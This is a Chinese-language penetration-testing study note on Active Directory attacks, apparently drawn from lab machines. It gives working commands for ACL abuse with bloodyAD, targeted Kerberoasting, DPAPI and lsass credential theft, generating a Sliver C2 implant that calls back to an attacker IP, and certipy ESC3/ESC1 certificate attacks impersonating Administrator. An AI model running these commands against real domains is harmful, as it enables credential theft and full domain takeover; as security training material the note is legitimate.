在AD域中，**每个域对象（如用户、计算机、组、组织单位等）都有一个与之关联的ACL**。这个ACL定义了**谁**（哪个用户、组或计算机）对这个对象有**什么权限**。bloodhound正是收集这些信息并进行图形化分析。

我们重点就是不安全的ACL权限配置：
| 权限                | 描述                                                         |
| ------------------- | ------------------------------------------------------------ |
| GenericALL          | 完全控制目标对象                                             |
| GenericWrite        | 可以修改目标对象属性                                         |
| WriteOwner          | 改变对象所有者                                               |
| ForceChangePassword | 强制改变密码                                                 |
| AddMember           | 有权向组中添加成员                                           |
| WriteSPN            | 为对象注册SPN                                                |
| ReadGMSAPassword    | 读取对象的gMSA密码  gMSA全称是**组托管服务账户**，它的密码由AD自动管理，而不是像普通服务密码那样需要手动设置。gMSADumper |

我们要关注横向移动的终点，通常是看哪个用户在一些比较关键的组，比如`RemoteManagerment`组，可以winrm远程登录。

### WriteSPN

通过WriteSPN权限为Alfred用户的注册一个虚构的SPN，这个SPN只要在域内是唯一的，DC就会接受它。然后DC就会认为这个虚假的SPN对应的服务由Alfred账户运行，任何用户都可以为这个服务请求kerberos票据，KDC会使用Alfred账户的NT哈希来加密这张返回的票据，我们拿到后离线破解即可。

可以使用github的targetedKerberoast执行kerberoasting攻击

## BloodyAD

用来利用上面不安全的ACL权限。

```
bloodyAD   xxx   remove uac "adam.silver" -f ACCOUNTDISABLE
```

AD域中的UAC是一个32为掩码，用于控制用户账户的各种属性。可以通过移除ACCOUNTDISABLE解锁账户。

```
bloodyADv  xxx   set password "adam.silver" 'Orange33315!'
```

设置密码

有很多功能可以通过登录后的**Powershell**实现，或者通过impacket工具包实现，比如更改对象的所有者

## Windows凭据

一般存放在`C:\Users\<Username>\AppData\Local\Microsoft\Credentials`下，存放的是经过**加密的**、与当前用户相关的本地登录**凭据**。比如使用rdp服务的时候，勾选“记住我”，windows凭据管理器就会把输入的用户名和密码就会作为一项windows凭据保存到这个文件夹中。这很像浏览器的“记住密码”功能。

加密是使用的Dpapi，加密的主密钥放在`C:\Users\<Username>\AppData\Roaming\Microsoft\Protect\`中。

这很像keepass的理念，使用一个主密钥加密其他密码。而这个主密钥本身是通过计算机用户的密码保护的，当我们有计算机账户的密码，想读取凭据文件时：

1. 下载密钥文件和凭据文件，使用impacket包中的dpapi.py解密
2. 上传mimikatz，利用dpapi模块中的masterkey方法传入密码后解密
3. mimikatz抓内存中解密好的主密钥，这样不需知道密码。但是需要SYSTEM权限。mimikatz抓内存一般都是为了横向移动，或者看看有没有域管理员登录残留的密码。在域渗透中需要区别本地管理员和域管理员

## C2

> **C2**，全称为 **Command and Control**，中文是 **“命令与控制”**。
>
> - **攻击者（黑客/红队）** 扮演 **“指挥部”**。
> - 植入在目标机器上的 **恶意软件（木马、后门）** 扮演 **“特工”**。
>
> C2的核心目的是建立一条从攻击者到受害主机的**秘密、持久、双向的通信通道**。通过这个通道，攻击者可以：
>
> 1. **下达命令**：让恶意软件执行各种操作。
> 2. **接收结果**：获取命令执行的结果，如窃取到的文件、密码等数据。
> 3. **远程控制**：实现对受害主机的远程控制，就像操作自己电脑一样。

C2的通信模式除了正反向shell，最常用的是beacon式，也就是植入体定期（如每60秒）向C2服务器“报到”一次，询问是否有新任务。

常见的C2工具有MSF的meterpreter载荷，Cobalt Strike（商业软件，业界标杆），Sliver（开源，强力替代品）等.C2用于后渗透阶段（已经获取了一个初始立足点比如一个shell），核心概念是隐蔽、持久，扩大权限并窃取数据。

我们这里使用sliver工具：

`apt install sliver`安装后包含`sliver-server`和`sliver-client`两条指令。客户端主要作用是在多人协作时，多个客户端操作员可以连接同一个服务端，协同工作。

直接运行`sliver-server`，然后使用generate生成植入物

```
[server] sliver > generate --mtls 10.10.16.19 -N puppy -O windows
```

--mtls是使用mtls协议通信，-N指定植入物名称，-O指定操作系统类型

然后通过evil-winrm或其他方式上传文件

上传后sliver运行mtls监听，winrm中运行植入物puppy.exe，成功监听到。

之后sessions查看ID，sessions -i指定ID进入交互页面。

## ADCS攻击

利用证书模板错误的权限设置。主要工具是certipy

```
certipy-ad find -dc-ip 10.10.11.71 -u Lion.SK -p '!QAZ2wsx' -stdout 
```

列举当前用户能申请的证书，然后ESC攻击，举例如下：

ESC3：名为Delegated-CRA的模板有**证书请求代理**扩展权限，可以和名为SingedUser的模板配合进行ESC3攻击：

1. **获取代理证书**：首先获得"Delegated-CRA"模板的证书请求代理证书
2. **伪造高权限身份**：使用该代理证书为"SignedUser"模板请求证书，并在请求中指定高权限用户（如域管理员）的身份

先申请一个有证书请求代理扩展权限的证书：

```
└─# certipy-ad req -dc-ip 10.10.11.71 -ca 'Certificate-LTD-CA' -template 'Delegated-CRA' -u Lion.SK -p '!QAZ2wsx'
```

然后用它代理为SingedUser模板申请一张管理员身份的证书：

```
└─# certipy-ad -debug req -dc-ip 10.10.11.71 -ca 'Certificate-LTD-CA' -template 'SignedUser' -u lion.sk@certitifcate.htb -p '!QAZ2wsx' -on-behalf-of 'CERTIFICATE\Administrator' -pfx lion.sk.pfx
```

ESC1：

申请时候直接-upn指明为admin申请证书，拿到admin证书

## 利用POWERSHELL

遇到过的指令：

| 指令                                                         | 描述                 |
| ------------------------------------------------------------ | -------------------- |
| Get-ADUser                                                   | 查看域中所有用户     |
| whoami  /all                                                 | 查看当前用户所有信息 |
| get-adgroup   -properties *                                  | 查看组的完整信息     |
| Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects | 检索被删除的对象     |
| Restore-ADObject -Identity c1f1f0fe-df9c-494c-bf05-0679e181b358 | 恢复AD对象           |
| Enable-ADAccount -Identity cert_admin                        | 启用AD账户           |
|                                                              |                      |

## lsass.exe 进程

全称： **Local Security Authority Subsystem Service**。本地安全认证子系统服务。

有什么：**用户明文密码**  **NTLM 哈希**  **Kerberos TGT 票据**  **Kerberos 会话密钥**

有什么用：

1. **横向移动**：
   - 使用获取的 **NTLM 哈希** 进行 **Pass-the-Hash** 攻击，访问网络中的其他机器。
   - 使用获取的 **明文密码** 通过 RDP、SMB 等协议登录其他机器。
   - 使用 **Kerberos 票据** 进行 **Pass-the-Ticket** 攻击。
2. **权限提升**：
   - 如果当前机器上有域管理员或其他高权限用户登录过，转储 lsass 很可能直接获取到他们的凭据。
   - 从 **LSA Secrets** 中获取的服务账户密码可能拥有更高权限。
3. **持久化与域控攻击**：
   - 获取 **计算机账户** 的哈希，可用于创建 **白银票据**。
   - 如果成功转储 **域控制器** 上的 lsass.exe，可以获得 **krbtgt** 账户的哈希，从而制作 **黄金票据**，实现对域的持久控制。

使用mimikatz获取（需要**SeDebugPrivilege** 权限）。一般都是用来看看有没有其他用户登录残留了凭据，或者持久化。